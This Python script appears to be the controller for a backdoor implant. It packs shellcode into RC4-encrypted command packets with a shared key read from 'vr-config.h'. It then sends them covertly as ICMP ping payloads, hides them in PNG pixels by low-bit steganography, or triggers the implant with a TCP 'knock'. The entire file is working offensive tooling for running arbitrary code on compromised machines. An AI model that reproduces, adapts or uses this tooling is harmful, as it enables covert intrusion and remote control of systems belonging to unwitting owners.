#!/usr/bin/env python
#
# MIT License
#
# Copyright (c) 2019 Rokas Kupstys
#
# Permission is hereby granted, free of charge, to any person obtaining a
# copy of this software and associated documentation files (the "Software"),
# to deal in the Software without restriction, including without limitation
# the rights to use, copy, modify, merge, publish, distribute, sublicense,
# and/or sell copies of the Software, and to permit persons to whom the
# Software is furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL
# THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
# FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
# DEALINGS IN THE SOFTWARE.
#
from __future__ import print_function
import argparse
import base64
import os
import re
import socket
import struct
import sys
import time
from script.ping import send_ping, PingError
from script.png import from_array, Reader

magic_v1 = 0xdfc14973


def rc4(data, key):
    data = bytearray(data)
    key = bytearray(key)
    x = 0
    box = list(range(256))
    for i in range(256):
        x = (x + box[i] + key[i % len(key)]) % 256
        box[i], box[x] = box[x], box[i]
    x = 0
    y = 0
    for i in range(len(data)):
        x = (x + 1) % 256
        y = (y + box[x]) % 256
        box[x], box[y] = box[y], box[x]
        data[i] ^= box[(box[x] + box[y]) % 256]
    return bytes(data)


def set_binary_mode(stream):
    if sys.platform == 'win32':
        import os
        import msvcrt
        msvcrt.setmode(stream.fileno(), os.O_BINARY)


def read_stdin():
    if sys.version_info >= (3, 0):
        source = sys.stdin.buffer
    else:
        set_binary_mode(sys.stdin)
        source = sys.stdin
    return source.read()


def bit_stream(data):
    # length
    for byte in struct.pack('!H', len(data)):
        for shift in range(0, 8, 2):
            yield (byte >> shift) & 3
    # data
    for byte in data:
        for shift in range(0, 8, 2):
            yield (byte >> shift) & 3


def pixel_stream(pixels):
    for y in range(len(pixels)):
        row = pixels[y]
        for x in range(len(row)):
            yield x, y, row[x]


def read_payload(path):
    if path == '-':
        return read_stdin()
    elif os.path.isfile(path):
        return open(path, 'rb').read()
    elif re.match('^[0-9a-f]+$', path, re.IGNORECASE):
        if sys.version_info >= (3, 0):
            return bytes.fromhex(path)
        else:
            return path.decode('hex')
    elif re.match('^[a-z0-9+/=]+$', path, re.IGNORECASE):
        return base64.b64decode(path)


def read_key(key):
    if key is not None:
        return key

    config_h = open(os.path.dirname(os.path.abspath(__file__)) + '/vr-config.h').read()
    key_integer = re.search(r'#define +vr_shared_key +(.+)', config_h).group(1).rstrip('l').rstrip('u')
    return struct.pack('<Q', int(key_integer, 16 if key_integer.startswith('0x') else 10))


def main(argv):
    parser = argparse.ArgumentParser()
    parser.add_argument('--key', help='Shared key')

    action = parser.add_subparsers(help='action help', dest='action')

    # Payloads
    shellcode = action.add_parser('shellcode', help='Reads shellcode, formats a src packet and prints it to stdout')
    shellcode.add_argument('src', help='Specify src as file path, hex string, base64 string or - to read from stdin')

    # Transports
    arg = action.add_parser('ping', help='Send src using icmp ping')
    arg.add_argument('target', help='Ping target')

    arg = action.add_parser('png', help='Encode src into PNG image')
    arg.add_argument('inout', help='PNG image in RGB format that will be used to encode data into')

    arg = action.add_parser('tcp_knock', help='Send a knock to a tcp port (grand theft socket)')
    arg.add_argument('target', help='IP address or a hostname of target server')
    arg.add_argument('port', help='Port on target server')
 
    arg_list = []
    key = None
    while argv:
        args = argparse.Namespace()
        args, argv = parser.parse_known_args(argv, namespace=args)
        if args.key:
            if not key:
                key = args.key
            else:
                print('--key specified multiple times', file=sys.stderr)
                return -1
        arg_list.append(args)

    if len(arg_list) == 0:
        parser.print_help()
        return 0

    payload = None

    for args in arg_list:
        # Format a shellcode execution packet
        if args.action == 'shellcode':
            command_id = 0
            payload = struct.pack('!IIB', magic_v1, int(time.time()), command_id) + read_payload(args.src)
            payload = rc4(payload, read_key(key))

        # Send src via icmp-ping
        elif args.action == 'ping':
            if payload is None:
                print('Please specify src first.', file=sys.stderr)
                return -1

            if len(payload) < 56:
                # If packet is too short - pad it
                payload += b'\0' * (56 - len(payload))

            send_ping(args.target, payload)
            print('{} bytes src sent to {}\n'.format(len(payload), args.target))

        # Send src by encoding it into a png image
        elif args.action == 'png':
            width, height, pixels, meta = Reader(bytes=read_payload(args.inout)).asRGB8()

            # Each byte (8 bits) is encoded into 4 other bytes, 2 bits at the end of each byte.
            # Payload needs at least 4x bytes of it's size.
            # Image has 3 bytes per pixel (RGB)
            if len(payload) * 4 >= width * height * 3:
                print('Image is too small', file=sys.stderr)
                return -1

            pixels = list(pixels)
            for b, (x, y, c) in zip(bit_stream(payload), pixel_stream(pixels)):
                c &= 0b11111100         # zero-out last two bits
                c |= b                  # encode new to bits
                pixels[y][x] = c

            from_array(pixels, 'RGB').save(args.inout)
            print(args.inout, 'saved')

        elif args.action == 'tcp_knock':
            command_id = 1
            payload = struct.pack('!IIB', magic_v1, int(time.time()), command_id)
            payload = rc4(payload, read_key(key))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((args.target, int(args.port)))
            s.send(payload)
            s.close()

    return 0


if __name__ == '__main__':
    try:
        sys.exit(main(sys.argv[1:]))
    except PingError:
        if os.name == 'nt':
            print('Ping failed.', file=sys.stderr)
        else:
            print('Ping failed. Did you run this with "sudo"?', file=sys.stderr)
        sys.exit(-1)
    except KeyboardInterrupt:
        sys.exit(0)
